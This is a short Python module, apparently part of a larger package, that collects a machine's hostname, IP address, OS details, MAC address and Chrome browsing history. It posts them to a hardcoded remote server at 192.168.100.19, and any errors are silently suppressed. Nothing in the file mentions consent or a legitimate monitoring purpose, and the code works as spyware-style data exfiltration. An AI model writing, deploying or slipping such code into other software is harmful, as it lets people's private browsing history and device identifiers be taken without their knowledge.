import socket, json, requests, platform, uuid
from .browser_utils import get_chrome_history

SERVER_URL = "http://192.168.100.19:5000/report"

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def collect_and_send_system_info(return_data=False):
    data = {
        "hostname": socket.gethostname(),
        "ip_address": get_ip(),
        "os": platform.system(),
        "os_version": platform.version(),
        "mac": hex(uuid.getnode()),
        "browser_history": get_chrome_history(),
    }

    if return_data:
        return {"url": SERVER_URL, "payload": data}
    else:
        try:
            requests.post(SERVER_URL, json=data, timeout=5)
        except:
            pass
